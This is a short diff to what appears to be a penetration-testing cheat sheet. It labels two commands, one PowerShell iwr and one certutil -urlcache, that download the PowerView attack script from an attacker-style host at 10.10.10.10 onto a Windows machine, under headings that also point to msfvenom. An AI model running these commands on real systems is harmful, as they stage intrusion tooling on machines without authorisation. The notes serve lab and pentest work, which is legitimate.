@@ -1,7 +1,7 @@
 # Download file
-	iwr http://10.10.10.10:8000/PowerView.ps1 -OutFilew C:\Windows\Temp\PowerView.ps1
+	run in powershell -> iwr http://10.10.10.10:8000/PowerView.ps1 -OutFilew C:\Windows\Temp\PowerView.ps1
 
- 	certutile -urlcache -split -f http://10.10.10.10:8080/PowerView.ps1 PowerView.ps1
+ 	run in cmd -> certutile -urlcache -split -f http://10.10.10.10:8080/PowerView.ps1 PowerView.ps1
 
 # mfsvenom
 
